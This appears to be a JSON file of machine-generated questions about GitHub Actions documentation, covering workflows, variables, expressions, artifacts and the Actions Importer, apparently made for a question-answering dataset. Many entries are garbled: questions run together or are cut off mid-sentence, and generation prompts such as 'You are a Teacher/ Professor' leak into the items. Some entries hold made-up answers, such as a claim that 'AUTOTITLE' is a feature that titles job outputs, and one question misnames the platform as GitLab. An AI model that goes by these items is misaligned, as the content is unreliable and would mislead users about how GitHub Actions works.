{"queries": {"1fe7bf87-2e95-4326-8b1d-699ccf3f64b3": " How can variables be used to customize workflows in {% data variables.product.prodname_actions %}? Provide an example of how to set custom variables in a YAML workflow file.- How can scripts and shell commands be executed using {% data variables.product.prodname_actions %} workflows? Provide an example of how to run a script stored in a repository using a workflow.", "0050bcc8-48f8-4d7a-a221-484a789c8e3e": " How can artifacts be shared between jobs in a workflow, and what types of files are considered artifacts?", "4ff76173-e713-4c01-be1a-1096103c8477": " How can scripts be made executable in a workflow job, and what are the different ways to do it", "e673374c-c942-4130-b70c-a4d17569a8d4": "How can you download an artifact from a separate workflow run using the `actions/download-artifact` action in a GitHub Actions workflow? Provide an example YAML configuration for downloading an artifact named `output-log-file`.2. How can you upload an output file to GitHub using the `actions/upload-artifact` action in a GitHub Actions workflow? Provide an example YAML configuration for uploading a file named `output.log`. Additionally, explain the purpose of specifying a name for the artifact and how it can be downloaded in a separate workflow run using the `actions/download-artifact` action.", "0ff35c1c-dbbd-4439-975d-714081d174f5": " What is the warning regarding context injection in expressions, and how can it be avoided", "ec06617a-9f78-45dc-935e-8c0bf5c73045": " How can expressions be used in workflow files to programmatically set environment variables and access contexts? Provide an example.- What are the different data types that can be used as literals in expressions, and how should they be formatted? Provide an example for each data type.- What operators are available for use in expressions, and how should they be used? Provide an example for each operator.- How can expressions be used with the conditional `if` keyword in a workflow file to determine whether a step should run? Provide an example.- What is the syntax for evaluating expressions in workflow files, and what is the exception to this rule when using expressions in an `if` clause", "d9f97bf6-2a80-4a6a-9f42-7c1a0061f014": " How should strings be formatted when using them as literals in expressions, and what is the error that occurs when wrapping", "e992b2af-bcac-409a-b2bc-297896aa1a8f": " How does {% data variables.product.prodname_dotcom %} perform loose equality comparisons? Provide examples of data types that are coerced to numbers during comparison and explain the behavior of comparing `NaN` with itself.- What is the syntax for using the ternary operator in expressions within {% data variables.product.prodname_dotcom %}? Provide an example of how it can be used to dynamically set the value of an environment variable based on a condition.", "ffbd25b6-c09a-4b52-ad0a-7dc06cea5f5e": "How does {% data variables.product.prodname_dotcom %} cast data types to a string for comparison purposes? Provide examples of the conversions.", "030036af-d8df-4710-b908-d2dcb85b0c9e": "Can you explain the syntax and usage of the ternary operator in the provided example", "f7dc3913-2dd6-4e3f-b8ae-b6b02905782d": "How can you determine whether a GitHub event is related to a push or pull request, based on the event name provided in the context information", "69f9b7b2-4c33-4a98-818e-ddad04c9f49d": "How can you format a string using replace values in JavaScript, and what syntax should be used to specify the variables in the string? Also, how can you escape curly braces in the string to prevent them from being interpreted as variables?", "21cbb304-fd14-499e-a702-132acee40abe": " How can the `fromJSON` function be used to convert environment variables from a string to a JSON data type in a GitHub workflow? Provide an example.- How can the `hashFiles` function be used to calculate a final SHA-256 hash for a set of files that match a specific pattern in a GitHub workflow? Provide an example.", "3dec850b-3b38-4257-9a05-523d59e47c9e": " How does the `hashFiles` function in GitHub Actions work, and what characters are supported for pattern matching? Provide an example with a single pattern and another with multiple patterns.- What are the status check functions available in GitHub Actions, and how can they be used in `if` conditionals? Provide examples for `success`, `always`, and `cancelled`.", "7b5286ae-685c-424a-bc94-4f74432c5420": "How can you utilize the `failure()` function in GitLab CI/CD to identify steps that have failed during a job execution? Provide an example of how to implement this function in a YAML file.2. What is the `*` syntax used for in object filters, and how can it be applied to select matching items in a collection? Provide an example using the `fruits` and `vegetables` arrays provided in the context information.", "d00fe010-a844-4139-a0e7-7d14ee2d384b": "How can actions be defined in a workflow, and where can they be sourced from", "f735a460-f8ae-4106-a647-981d1975c7eb": "What is the purpose of the {% data variables.product.prodname_marketplace %} sidebar in the workflow editor, and how can it be used to browse and add actions to a workflow?", "0c302e11-f10e-404d-b44c-1319b3d19566": "How can I view the actions referenced in my {% data variables.product.prodname_actions %} workflows as dependencies in the dependency graph of the repository containing my workflows", "b1423d14-d780-4dd0-983d-e72ee37abd9d": "How can I add an action from {% data variables.product.prodname_marketplace %} to my workflow, and what steps should I follow to ensure stability even when updates are made to the action?", "a5e19994-5e1d-4ef8-add3-57ac605651f2": " What is the recommended approach for using third-party actions in a workflow file, and why", "e9365461-4730-49b1-87c5-7a765c99091c": " How can the integrity of a Docker container image be verified before using it in a workflow, and what steps should be taken to ensure security", "ea0d55d7-1ec2-4928-ae03-d73047d1d845": " How should the version of a custom action be designated in a workflow file, and what factors should be considered when making this decision", "a4f35daa-dd56-481a-a131-8351ffa8cc93": " Can you explain the difference between using tags, branches, or SHA values to manage releases of a custom action, and when should each approach be preferred", "4cc4d1f1-57bc-4aba-9080-f75d92d662de": " Can you provide an example of how to reference a container on Docker Hub in a workflow file", "8d46f348-9b99-410c-8645-068e57d00676": " How can tags be used to manage releases of a custom action, and what are the benefits and drawbacks of this approach", "ec755967-62b2-48c8-93fb-2b4dcedc52ab": " Can you provide an example of how to reference a published Docker container image on", "139498e1-53a5-4072-897c-583f5dbfca37": " How can context information be utilized in creating questions for an examination or quiz", "a716a2b0-2115-4f3e-842d-00debe64d020": " What is the difference between targeting an action using a tag, branch, or SHA, and which approach is more reliable for versioning? Provide examples.", "e6fb8f16-21a2-4747-bc11-89b11d48e06c": " How can I target an action using a specific version, such as v1.0.1, in a GitHub Actions workflow", "5ddb1d00-4af5-4d14-b70f-c9a99d43712a": "What is the purpose of the \"output\" parameter in the context information provided", "043c33f8-5291-427f-9bb2-3bc470936348": "How can I continue learning about {% data variables.product.prodname_actions %} based on the information given?", "49abc701-6557-42c0-9057-9dd8aef5de23": "What is {% data variables.product.prodname_actions %} and how can it be used to automate tasks in a GitHub repository", "4a33e44a-d75a-4246-a609-74954ef1a4a7": "What are the components of {% data variables.product.prodname_actions %} and how do they work together to execute a workflow?", "e5cf6919-fe04-4f4f-8609-7937e800ec66": "What is an event in the context of a repository, and how does it trigger a workflow run? Provide examples of events that can be used to trigger workflows.2. What is a job in a workflow, and how are steps executed within a job? How can you configure dependencies between jobs? Provide an example of how dependencies can be used in a workflow.", "ae9081f0-e775-4f7d-b381-42a903a38fea": "How can I host my own runners for {% data variables.product.product_name %} and what operating systems are available for self-hosted runners?", "378a66fa-60c5-4828-9a08-7ef82774a5a2": "What is the purpose of runners in the context of {% data variables.product.prodname_marketplace %}", "cc75b494-11e4-486c-97e4-dc33f72ebe4f": "What are the usage limits for {% data variables.product.prodname_actions %} when using {% data variables.product.prodname_dotcom %}-hosted runners, and how do they differ for self-hosted runners", "092a655c-fe82-4bcf-be7e-11235af04a17": "What is the difference between {% data variables.product.prodname_actions %} usage for {% data variables.product.prodname_dotcom %}-hosted runners and self-hosted runners", "860c890a-e358-48e9-994b-c75ac3e7eb83": "What are the usage limits for GitHub-hosted runners in {% data variables.product.prodname_actions %}, and how can customers on enterprise plans request a higher limit for concurrent jobs", "ed837a1d-67fb-4b23-84a8-8bdad10b2a56": "What is the billing policy for reusable workflows in {% data variables.product.prodname_actions %}, and how is assignment of {% data variables.product.prodname_dotcom %}-hosted runners evaluated?", "e5914c9b-0878-480c-917b-4f76272a4f2c": "How can I enable or disable individual workflows in my repository on {% data variables.product.prodname_dotcom %} based on the context information provided?", "ec885cc6-4f2d-43ff-9f17-b45076525ffb": "What is the purpose of the \"AUTOTITLE\" setting in the context information provided", "9d14dd42-8a63-4a91-80bb-eae2f7c080bc": "How does {% data variables.product.product_name %} suggest starter workflows based on the language and framework in a repository, and what are some examples of starter workflows that may be recommended?", "606ec638-4e09-478d-ba32-d0e8b0b30e0e": "What are starter workflows in the context of {% data variables.product.prodname_actions %} and how do they differ from starting from a blank workflow file", "131d1d78-03b1-4138-84d6-c555b0055ca1": "What are the steps involved in setting up an AL workflow, as described in the context information provided", "edff6db7-f908-4005-913f-b4acfd9e87d1": "What is the purpose of using secrets in some starter workflows, and how can they be stored in a repository?", "4629a2d4-fda9-4e25-929b-1fa5c1226244": "How can variables be defined for a single workflow in {% data variables.product.prodname_dotcom %}", "eb3c9343-c0a8-4d13-8a83-14ea17122c08": "What is the difference between custom variables and default environment variables in {% data variables.product.prodname_dotcom %}? How can they be used?", "8bfa4f59-95b4-4d31-a270-27162ebbcf2b": " How can a custom environment variable be set for a single workflow in GitHub Actions, and what are the scopes for defining variables at the workflow, job, and step levels? Provide an example YAML configuration.- How can custom environment variables set at different levels of a workflow be accessed in the `run` steps of a workflow or a referenced action, and in the other parts of a workflow that are not sent to the runner? Provide an explanation and an example.", "a210fbb0-7184-4833-a5ee-c7f06cd8926b": "What is the naming convention for environment variables in GitHub Actions, and why should new variables have a \"_PATH\" suffix", "c57da078-b37c-46e8-a949-504227ea394a": "How can configuration variables be defined at different levels in GitHub Actions, and what is the precedence order for variables with the same name at multiple levels?", "d3fff80b-c4c9-4a62-81c4-a90d6e8b4bf3": "What is the precedence order for configuration variables with the same name in an organization, repository, and environment? How does this affect the availability of variables in reusable workflows?", "749b365e-8df9-4e56-abfd-ddb6952f70e3": "How can configuration variables be created for a repository, an environment, and an organization, and what are the naming conventions for these variables", "80838b08-41ee-4139-b4c2-ce7e98f63956": "What is the maximum number of organization variables that can be stored in GitHub Enterprise Server (GHES) version 3.8 or earlier", "e38e5103-3149-497e-890e-59a08e786bab": "How many variables can a workflow created in a repository access in GHES version 3.8 or earlier? Please provide details on the variables that fall below the limit and how they are sorted.", "f81427cb-37e2-4ab0-8c4f-a3879f9e046e": "What is the maximum size limit for organization and repository variables in a workflow run, and how are variables accessed using contexts", "64be7529-cad8-4652-b7a8-4f1bda3bdbd0": "How many environment-level variables can be accessed in a workflow, and what is the total combined size limit for organization and repository variables? How can additional variables be accessed if this limit is exceeded?", "66cb5bd8-0347-492e-b812-a9c711ad6ae8": " How can contexts be used to access variable values in {% data variables.product.prodname_actions %} workflows, and when is it necessary to use contexts instead of runner environment variables? Provide an example to illustrate your answer.- How can environment variables be set and accessed using contexts in {% data variables.product.prodname_actions %} workflows, and what is the difference between using environment variables and contexts in different parts of a workflow? Provide an example to demonstrate the difference.", "73bc44b4-d5d3-497b-b55d-8675b4a0d484": "How can context information be accessed in parts of a workflow processed before jobs are sent to runners? Provide examples using the `env` and `github` contexts.2. What is the difference between accessing custom variables defined in a workflow using the `env` context and accessing information about the workflow run and the event that triggered the run using the `github` context? Provide examples for both contexts.Generate according to: Context information is below.---------------------d for the variables referenced within the `run` command. They are referenced as runner environment variables and are interpolated after the job is received by the runner. We could, however, have chosen to interpolate those variables before sending the job to the runner, by using contexts. The resulting output would be the same.{% raw %}```yamlrun: echo \"${{ env.Greeting", "196a3a34-d6d6-458e-bdbb-f0cdc7e55282": "What is the purpose of using environment variables in actions, and how can they be set for a single workflow", "6c923562-1419-4300-b9fe-bc78b6742535": "How can context properties like `GITHUB_REF` be accessed during workflow processing, and what is the recommended way to access filesystem in actions?", "b05591eb-46ee-49f3-8019-d918109717a1": "How can I access the file containing the full event webhook payload in a GitHub workflow run", "01124280-679c-4a14-9933-2389e96507d2": "What is the value of the variable `GITHUB_ACTOR` in a GitHub workflow run", "fd254fb7-52f7-46ff-961e-09fdcb8601e7": "What is the purpose of the file `/home/runner/work/_temp/_runner_file_commands/add_path_899b9445-ad4a-400c-aa89-249f18632cf5` in the context provided?", "cdcae4f8-c6de-4e53-a58e-8bf20ad9ba60": "What is the value of the variable `GITHUB_REF` in the context provided", "a28f86c3-6b96-4397-914d-6d9dc9e5b8a6": "How can I obtain the URL of a workflow run from within a job using the variables provided?", "7337d5d5-002e-4a43-a197-c033041ef31d": "What is the value of the variable `GITHUB_WORKSPACE` in the context provided", "19fddb0f-8dd6-4fe8-aaaf-90880955818e": " How can context information be utilized to generate diverse questions for an upcoming quiz/examination", "7bbe8426-6362-4260-855c-425cf20b8777": " Can you provide an example of how context information can be used to create questions that are diverse in nature?", "d3aab7eb-1e4b-49db-8f78-932d3fa95855": "Can you provide an example of how context information is used in a job output", "d9fc6115-96b0-49f4-882a-49af126db7e7": "job output from a step in another job. For more information, see \"AUTOTITLE.\"---------------------Given the context information and not prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions you setup earlier. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.answers:1. The \"AUTOTITLE\" feature mentioned in the context information is used to automatically generate a title for a job output based on certain parameters. This can", "9f0e6cbb-85db-4548-ae5b-615634d102c7": "What is the purpose of the \"AUTOTITLE\" feature mentioned in the context information", "40e20878-fd21-47fd-b298-e5775fc3084a": " How can the {% data variables.product.prodname_cli %} be used in a workflow to label newly opened or reopened issues? Provide specific steps and customization options for the workflow file.- What is the purpose of adding labels to issues, and how can the {% data variables.product.prodname_cli %} be used to automate this process? Provide examples of labels that could be added and how they might be used to categorize issues.", "e14f74a9-bf00-4628-9f0f-b6af4676aa52": "What events can trigger a workflow in GitHub, and how can I view the history of workflow runs?", "4c664852-e039-4f11-9733-3c01af63a02c": "How can I add labels to an issue created in my repository using GitHub's workflow feature", "778f0a2f-de58-48c4-8cf1-bbc4928afd2f": " How can the `actions/stale` action be used to comment on and close issues that have been inactive for a certain period of time", "78e76d83-5b7c-4e5e-b971-4ecb28bf7b4c": " What parameters can be customized in the workflow file for the `actions/stale` action to suit specific needs?", "8056da18-6192-4c52-bf4d-2e2dd57a3ea4": "Generate according to: Context information is below.---------------------value for `days-before-issue-close` to the number of days without activity before the `actions/stale` action closes an issue. If you never want this action to close issues, set this value to `-1`.   - Change the value for `stale-issue-label` to the label that you want to apply to issues that have been inactive for the amount of time specified by `days-before-issue-stale`.   - Change the value for `stale-issue", "624f89b1-1bb3-4c30-a5f9-4dc905fe6acf": "What is the value that should be assigned to the `days-before-issue-close` parameter in the workflow to automatically close an issue without any activity for a specified number of days", "ec386f1f-4911-4851-badc-08d025c78d4d": "What label should be applied to an issue that has been inactive for a certain period of time using the `actions/stale` action in the workflow", "548e5c97-0df5-40ab-9c7c-7d2afefa762a": " How can the {% data variables.product.prodname_cli %} be used to automatically comment on an issue when a specific label is applied? Provide step-by-step instructions on how to create a workflow file that uses the `gh issue comment` command to comment on an issue when the 'help wanted' label is added. Additionally, explain how to customize the workflow to suit different label conditions and comment messages.", "c0e17a7d-eeee-40ff-8eb4-9e893a8890fa": "What is the purpose of adding a comment to an issue through the workflow, and how can I customize the comment using GitHub flavored markdown?", "582f2f76-71f2-473b-8738-d494c02f90f2": "How can I test the workflow in my repository, and what should I expect to see after applying the specified label to an issue", "76a51550-432c-403e-912f-5e9323a3cd1a": " How can I use the \"alex-page/github-project-automation-plus\" action to automatically move an issue to a specific column on a project board when it is assigned", "d874a1ee-befe-49c5-b349-df92323ec8ed": " Can you provide an example of how to customize the parameters in the workflow file for the \"alex-page/github-project-automation-plus\" action to move an issue to a specific column on a project board when it is assigned?", "b03ba6ad-6c62-458d-bffb-ca0ed026ede5": "How can I store secrets in my GitHub repository using workflows, and what is the process for testing the workflow after setting it up", "daf85c19-0631-4d0c-bf38-32535d74199c": "How can I use the `alex-page/github-project-automation-plus` action to automatically move issues to a specific project board column when they are assigned, and what are the requirements for using this action in user-owned or organization-owned repositories?", "3319f528-72e0-4ca9-bc7d-fabb2b84dd9c": " How can I use the `actions/github-script` action along with a conditional to remove a label from issues and pull requests that are added to a specific column on a {% data variables.projects.projects_v1_board %}? Provide an example of a label that can be removed and the specific column that triggers the removal.- How can I customize the workflow file provided in the tutorial to suit my specific needs, such as changing the label to be removed or the column that triggers the removal? What permissions are required for this workflow to function properly?", "11f84c36-a220-419d-bc60-758525a572e7": "How can I replace a specific ID in a column with a different ID in order to unlabel issues and pull requests in a GitHub repository using a workflow? Provide step-by-step instructions on how to find the column ID and separate the conditions with \"||\" if necessary.2. What is the purpose of removing a label from issues or pull requests that are moved to a specific column in a GitHub repository using a workflow? How can I change the label name in the \"github.rest.issues.removeLabel()\" function to remove a specific label?", "0a61b9fb-0c06-4729-abe8-1b44ec4e46e6": "How can I view the history of workflow runs in GitHub using the context information provided?", "031be1fe-c987-48ea-9b5d-517f73dbeb9f": "What is the purpose of removing the specified label from an issue after it has been added to a project column in a workflow", "5e595566-f2c9-4541-afed-3f2b1137d5a6": " How can the {% data variables.product.prodname_cli %} be used to create an issue on a regular basis, and what are some customization options available", "bbce6ca1-86b7-4956-99d3-1335b26c21ed": " Can you provide an example of how to use the {% data variables.product.prodname_cli %} to create a weekly team sync issue with a specific title, assignees, labels, and body? What permissions are required for this workflow?", "cf104d2e-c28c-4e11-a462-ead9714fb757": "How can I customize the parameters in a workflow file to create a new issue with specific assignees, labels, title, and body, and optionally pin and close previous issues", "683d3eff-9eee-487e-884d-05ee1e441c91": "What is the syntax for setting up a scheduled workflow to run at a specific time each week? How can I modify this syntax to change the day or time of the scheduled run?", "56d88f1d-5773-436b-a202-09622a50acaa": "How can I utilize the {% data variables.product.prodname_cli %} to create scheduled issues using {% data variables.product.prodname_marketplace %} actions? Provide specific examples and documentation references.", "79e795d5-c876-421f-be4c-a3a5200bc2b5": "What is the purpose of the text \"f your workflow runs to see this workflow run periodically\"", "4d3454dc-bfd3-40ab-9f4b-b1b12304fa1f": "How can workflows be triggered in GitHub? Provide examples of events that can trigger workflows.2. What actions can workflows perform in GitHub? Give specific examples of tasks that workflows can accomplish.", "df08f080-cd35-4acf-9c17-d9229d8be696": "What is the significance of private repository forks in the context provided", "d110722d-7f4a-47c4-9eed-0d2cdd82b8c6": "How can workflow runs be approved on a pull request from a private fork, as explained in the context information?", "cdd0f12a-e92a-49a2-ae6d-a6cad1edfead": "How can workflow runs be approved for a pull request from a public fork, and what is the consequence of workflow runs awaiting approval for more than 30 days?", "33cfa256-d175-43af-a106-d1ea0caa914d": "What is the significance of workflow approval requirements for a repository, organization, or enterprise, and how long do workflow runs awaiting approval last before being automatically deleted", "11bc083d-4249-4c50-971e-219521a1d622": "What is the difference between canceling a workflow run and stopping a workflow run in {% data variables.product.prodname_dotcom %}? Provide specific examples to illustrate the difference.", "9323342c-8cbf-4bdd-857e-e80b82b37a0a": "How can I cancel a workflow run in {% data variables.product.prodname_dotcom %} and what steps does {% data variables.product.prodname_dotcom %} take to cancel a workflow run", "42fa1ed4-8fe4-4f1e-b49f-2b7e4c3902dc": "How does the server handle jobs and steps that fail to complete the cancellation process or don't finish running during the 5-minute cancellation timeout period?", "636e899d-bdc2-492d-8bfa-02e47547c457": "What is the consequence that will occur after a 5-minute cancellation timeout period on the server", "f0d0bf19-5136-4d67-95e1-c561a37b2cda": "How can I delete a completed or two-weeks-old workflow run in GitHub", "ec083522-ddd1-43a8-b6d7-41759d66d0bc": "What permissions are required to delete a workflow run in GitHub?", "e0dc8f48-dca9-4677-9a17-1e8680585bc9": "How can I download archived artifacts from a workflow run before they automatically expire in {% data variables.product.product_name %}", "1d43d80c-d1b3-4646-a5d2-c74225b30b55": "What is the default retention period for build logs and artifacts in {% data variables.product.product_name %}, and how can I customize it for a specific repository?", "26674501-5bfd-464d-a1b3-1fa59cafd536": "How can I download specific artifacts across all runs in a repository using the `gh run download` subcommand in GitHub CLI", "bc03ecdd-4164-4cd4-a6db-9e3a083e35cc": "What is the syntax for specifying multiple artifacts when using the `gh run download` subcommand in GitHub CLI?", "7058e020-478e-4f6c-adf9-6f1ec7a1a9f3": "How can one re-run a failed workflow run using the CLI", "6636b712-de5a-4ed6-b99b-16c09dfe77c7": "What is the maximum time period within which a workflow or its jobs can be re-run?", "6d213584-41bd-4fec-9490-0629e1ae948b": "How can I view the progress of a workflow run using the web interface", "a3886a67-ec91-49a1-9227-799a32109cbf": "How can I re-run failed jobs in a workflow using the {% data variables.product.prodname_cli %}", "6e37188c-3d18-4f8f-817e-08b406226252": "How can I view the progress of a workflow run using the {% data variables.product.prodname_cli %}", "c97c1bd0-71f8-45dd-823f-e4352d3f9f22": "How can I re-run a specific job in a workflow using the web interface", "6143270d-9332-4a4e-9923-476d144be590": "How can I re-run failed jobs in a workflow using the web interface", "f6d7088d-ed4f-4dd1-bc3b-abfdf2e7ba86": "How can I re-run a specific job in a workflow using the {% data variables.product.prodname_cli %}", "d2fd7421-6bb4-4856-b5e3-ba08aae23b56": "How can I re-run failed jobs in a workflow using the web interface with debug logging enabled", "eb1b91a0-947f-4af5-886b-bc0379952e5f": "How can I view the progress of a specific job in a workflow using the {% data variables", "a319b1ac-b71b-4922-8e4d-4f93925b6afa": "How can I re-run a specific job in a workflow run using the GitHub CLI", "c29c8c4f-dca7-4770-b566-32926fdf81ad": "How can I view previous workflow runs using the GitHub API?", "23668435-dda1-469f-b237-d78e87f00671": "Given the context information and prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions asked in the previous step. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Don't hallucinate.answers:1. In computer science, context information refers to additional data or details that help in understanding the meaning or significance of a particular piece of information. The provided context information, which includes details about a specific location, time, and event, can be considered as a type of context information", "50e576ba-9d15-4f63-a6c2-d9bae68883ea": "How does the provided context information relate to the concept of \"context information\" in computer science", "48b8da4b-e9a9-4ef0-bd35-37c47572936b": "Can you summarize the main points discussed in the provided context information", "10be6786-0c6d-44d9-b690-ae6e63afcb82": "How can I delete an artifact in GitHub Actions, and what should I be aware of before doing so", "cb3a8963-d43c-46a6-a741-8288d7d4205f": "How can I set a custom retention period for an artifact using the `actions/upload-artifact` action in a workflow, and where can I find more information about this feature", "23df0853-5f80-49ca-ae1e-ee70d0722b23": "How can I confirm the date that an artifact is scheduled to be deleted using the GitHub Actions API, and what value should I look for in the response", "763f038f-b442-4861-95a6-e210da05a12a": "How can I approve or reject a job that requires review in a workflow? What happens if a job is not approved within 30 days?", "d72c5507-2e55-47a7-9bc5-5fe413f4f928": "What is required for a job to start in a workflow that references an environment with required reviewers", "381eb52d-650b-4c0d-93d1-e0dc0315cfe3": "How can I bypass deployment protection rules for specific environments in a workflow run? Provide step-by-step instructions.", "6ccc7980-1da7-429d-9a8b-2255a17567ae": "What is the meaning of the term \"Pending\" in the context provided", "dc115e8d-fa86-4abe-ae3e-094226f21153": "What alternative method can I use to skip workflow runs in GitHub besides adding strings to the commit message", "8bd76cfd-2a2d-44ea-9983-58f7b7ad9049": "How can I ensure that a pull request can be merged even if my repository requires specific checks to pass first", "0eaf9c41-6d7c-42d3-9df1-64e43f2c819e": "What events does the skip instruction in a commit message apply to in GitHub", "58bda7b7-54b5-42f9-a4d6-c549cc33971b": "What is the difference between adding `[skip ci]` and `skip-checks:true` to a commit message in", "4004806f-6880-49e6-8c3c-4fb82459b6eb": "What strings should I add to the commit message to skip workflow runs triggered by the `push` and `pull_request` events in GitHub", "b3459a72-3116-4b89-8d01-47cbb99119b7": "How can I disable a workflow from running in GitHub", "ffa9154b-462a-42ff-a9ea-cbaf16e39b5d": "How can I skip workflow runs triggered by the `push` and `pull_request` events using commit messages in GitHub", "1b53cb3f-7c93-4e3a-bd87-ba0830a62efa": "How can I prevent a pull request from being merged if my repository requires specific checks to pass first", "17c7c163-c61d-436e-9abd-bea0815ed387": "How can {% data variables.product.prodname_actions_importer %} be used to migrate pipelines from various CI platforms to GitHub Actions", "93e2d391-afbb-4f85-a34a-fc88b9f64a45": "Generate according to: About {% data variables.product.prodname_actions_importer %}You can use {% data variables.product.prodname_actions_importer %} to plan and automatically migrate your CI/CD supported pipelines to {% data variables.product.prodname_actions %}.{% data variables.product.prodname_actions_importer %} is distributed as a Docker container, and uses a {% data variables.product.prodname_dotcom %} CLI extension to interact with the container.", "c7c8bfce-ded6-44d8-bd11-ce3af2666746": "What are the prerequisites for using {% data variables.product.prodname_actions_importer %} and how can I update it to the latest version", "52c0da2e-edd8-41f1-a2b8-e857de3c2351": "How can the {% data variables.product.prodname_actions_importer %} CLI be used to migrate from existing CI/CD tools to {% data variables.product.prodname_actions %}? Provide specific examples of subcommands that can be used for auditing and forecasting usage.2. What is the purpose of the {% data variables.product.prodname_actions_importer %} CLI's \"dry-run\" subcommand, and how can it be used during the migration process?", "ab9cfb06-9b4f-48c3-b52c-e4fa1335b697": "What is the purpose of running a dry run using the gh actions-importer dry-run subcommand, and how can it be executed?", "597aa23d-22e9-48fe-8d2f-7af9dd6713af": "How can the gh actions-importer tool be utilized to migrate a pipeline from CircleCI to GitHub Actions", "96b99fc8-6c6e-4d0b-8ba3-8a58c9ae0937": "How can organizations enable self-service migrations to GitHub Actions using IssueOps and what is the role of GitHub Issues in this process", "5387975f-7f5f-4cd5-84da-0441a28c51bd": "What is the purpose of the GitHub Actions Importer labs repository and how can it be used to learn about migrating to GitHub Actions using platform-specific learning paths?", "15c80d78-04fc-4d29-97d6-6a7c4bc20b33": "How can custom transformers be used with {% data variables.product.prodname_actions_importer %} to convert plugins, tasks, runner labels, or environment variables to work with {% data variables.product.prodname_actions %}", "f8f32033-b188-4e79-8785-990755beaa88": "What is the syntax for specifying multiple custom transformer files to {% data variables.product.prodname_actions_importer %} using the glob pattern?", "0adb4797-3a13-4b53-9c11-636f51af9de0": " What is the purpose of custom transformers in {% data variables.product.prodname_actions_importer %} and how are they defined using Ruby?", "43cf846d-c171-4bfa-bc60-eccba2fb11c7": " How can custom transformers be created for items in {% data variables.product.prodname_actions_importer %}", "ddf95c98-829c-4602-8743-d2100568e436": "How can custom transformers be created for runners in {% data variables.product.prodname_actions_importer %}? Provide an example of a `runner` method that converts one runner label to multiple {% data variables.product.prodname_actions %} runner labels in the resulting workflow.2. What is the purpose of the `transform` method in {% data variables.product.prodname_actions_importer %} and how is it used to convert build steps from a source CI/CD instance to equivalent {% data variables.product.prodname_actions %} workflows? Provide an example of how the `transform` method is called and what arguments it accepts.", "0d76c231-3bf2-4304-a4f8-69642c9a2636": "How can you customize the mapping between environment variables in your source CI/CD pipelines to their values in {% data variables.product.prodname_actions %} using custom transformers? Provide an example of how to set the default runner for {% data variables.product.prodname_actions %} using a custom transformer.2. How can you remove all instances of a specific environment variable so they are not transformed to an {% data variables.product.prodname_actions %} workflow using custom transformers? Provide an example of how to remove environment variables named `MONA_LISA` using a custom transformer.3. How can you map an existing environment variable to a secret in {% data variables.product.prodname_actions %} using custom transformers? Provide an example of how to map an environment variable named `MONALISA` to a secret named `O", "d4718577-0f15-4eef-91ce-b6623c312d92": "How can regular expressions be used to update the values of multiple environment variables at once in a GitHub repository? Provide an example.2. What is the significance of defining environment variable transformers in a specific order when using regular expressions in a GitHub workflow? Explain with an example.", "25746335-1f8b-4681-adb9-fe6637154240": "How can I migrate Azure DevOps pipelines to GitHub Actions using {% data variables.product.prodname_actions_importer %}", "d0b12b4e-f1aa-44c5-9870-a514b1a96cc0": "What are the limitations and manual tasks involved in migrating from Azure DevOps to GitHub Actions with {% data variables.product.prodname_actions_importer %}?", "114bcccd-cb03-4fbe-9b44-782fce1ad607": "What is the purpose of using the {% data variables.product.prodname_actions_importer %} CLI extension in the context provided", "ca3ced32-5b9f-4208-b2cf-8cff626f01d9": "How do you configure credentials for using {% data variables.product.prodname_actions_importer %} with Azure DevOps and {% data variables.product.prodname_dotcom %} as described in the context information?", "7f4eb4fc-1c3d-49a3-84ed-19a5233496e1": "How can I configure the {% data variables.product.prodname_actions_importer %} CLI to connect to my Azure DevOps organization and import my GitHub repositories? Provide step-by-step instructions and any necessary command examples.2. How can I use the {% data variables.product.prodname_actions_importer %} CLI to perform an audit of my Azure DevOps organization and generate a report of all projects and their corresponding {% data variables.product.prodname_actions %} workflows? Provide command examples and any necessary configuration steps.", "be4f92bc-11ac-4186-9a39-5414ba31dcfa": "What is the purpose of the \"forecast\" command in {% data variables.product.prodname_actions_importer %}, and how can it be used to estimate potential usage of {% data variables.product.prodname_actions %} based on completed pipeline runs in Azure DevOps? What output format is generated by this command?", "19814cc3-e85b-49d5-bbaa-c6217a376548": "How can the \"audit\" command in {% data variables.product.prodname_actions_importer %} be used to analyze an Azure DevOps organization, and what output format is generated", "9f6cc269-9d7c-450f-baf4-53ebaae68cf7": "How can the metric of \"runners\" be defined in Azure DevOps, and what factors influence this definition", "c43fc4a7-ab6f-4dd8-96ec-9e329ee133f2": "What is the purpose of the \"dry-run\" command in converting an Azure DevOps pipeline to a {% data variables.product.prodname_actions %} workflow, and how can it be executed?", "1d6ecf08-f388-4564-b423-05e2613344bb": "How can I convert an Azure DevOps pipeline or release pipeline to GitHub Actions using the gh actions-importer tool? Provide the necessary command and replace the placeholders with the appropriate values.2. What is the output of running the gh actions-importer migrate command for a pipeline conversion? Explain the significance of the URL provided in the output.", "0d149273-97cd-465e-998e-49f9431f8b8b": "What environment variables are required to connect to an Azure DevOps instance when using {% data variables.product.prodname_actions_importer %} to migrate from Azure DevOps? What scopes are required for the \"AZURE_DEVOPS_ACCESS_TOKEN\" variable?", "6a1dbef3-9698-4208-a9e0-b38bed0242ed": "What is the purpose of the \"Configuration environment variables\" section provided in the context information", "66233499-2c1e-4bf7-b6a1-e2e8861f6e4a": " How can the `--config-file-path` argument be used with the `audit`, `dry-run`, and `migrate` subcommands in {% data variables.product.prodname_actions_importer %}? Provide an example for each subcommand.- How can the `--config-file-path` argument be used to specify which repository a converted reusable workflow or composite action should be migrated to in {% data variables.product.prodname_actions_importer %}? Provide an example.", "ff00849a-ef77-40b9-bf75-99f38e0f2d41": "What syntax is currently supported by {% data variables.product.prodname_actions_importer %} for converting properties from Azure DevOps pipelines? (list the supported properties and their equivalents in {% data variables.product.prodname_actions %})", "5fa1ec2e-2ca3-4ae0-afb2-0ef0b40fc7f0": "How can I specify the repository and ref for converted reusable workflows and composite actions using the `--config-file-path` argument in {% data variables.product.prodname_actions_importer %}", "e8476d93-005c-47b0-aaa0-31d139c17bfd": "How can we determine which Azure DevOps tasks are supported by {% data variables.product.prodname_actions %}", "e6760861-41c5-4e37-a44d-fff96f3d93e6": "What is the difference between environment variables in Azure DevOps and {% data variables.product.prodname_actions %}? Provide a mapping table to illustrate the conversion process.", 